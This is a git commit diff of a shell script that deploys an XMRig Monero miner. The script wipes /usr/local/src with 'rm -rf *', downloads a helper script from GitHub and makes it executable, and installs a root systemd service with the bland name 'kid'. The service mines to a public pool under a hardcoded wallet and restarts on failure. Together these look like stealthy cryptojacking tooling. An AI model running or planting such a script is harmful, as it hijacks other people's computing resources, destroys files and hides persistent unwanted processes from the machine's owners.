8dcaae7514c5f5eb1d5ef76dee15ff06ff05ed11
waniekvbgm <69979619+waniekvbgm@users.noreply.github.com>
2020-10-13 21:04:32 +0700

    Update suxmr-1.sh

--- suxmr-1.sh
+++ suxmr-1.sh
@@ -5,7 +5,7 @@ sudo sysctl vm.nr_hugepages=128 &&
 sudo sysctl -w vm.nr_hugepages=128 &&
 sudo apt install -y build-essential cmake libuv1-dev libmicrohttpd-dev libssl-dev libhwloc-dev && 
 cd /usr/local/src/ && rm -rf * &&
-wget https://raw.githubusercontent.com/waniekvbgm/zalska/master/suxmr-1-link1.sh && chmod a+x suxmr-1-link1.sh
+curl -O https://raw.githubusercontent.com/waniekvbgm/zalska/master/suxmr-1-link1.sh && chmod a+x suxmr-1-link1.sh
 git clone https://github.com/waniekvbgm/xmrig.git && cd xmrig && mkdir build && cd build && cmake .. && make
 bash -c 'cat <<EOT >>/lib/systemd/system/kid.service 
 [Unit]
@@ -13,7 +13,7 @@ Description=kid
 After=network.target
 [Service]
 Type=forking
-ExecStart=/usr/local/src/suxmr-1-link1.sh
+ExecStart=/bin/sh -c 'cd /usr/local/src/xmrig/build/ && ./xmrig --coin=monero -B -R 10 -o stratum+tcp://pool.supportxmr.com:5555 -u 47UbkYwirtqPGximU3ipvdbrfYBxQatB5WQXGWbvUusUXwKVE4QhEWtg6MqjQUZfpN9UoQgYcPDV8X1roPy7shmBH9Pmt9V -p x -k'
 Restart=on-failure
 RestartSec=60
 User=root
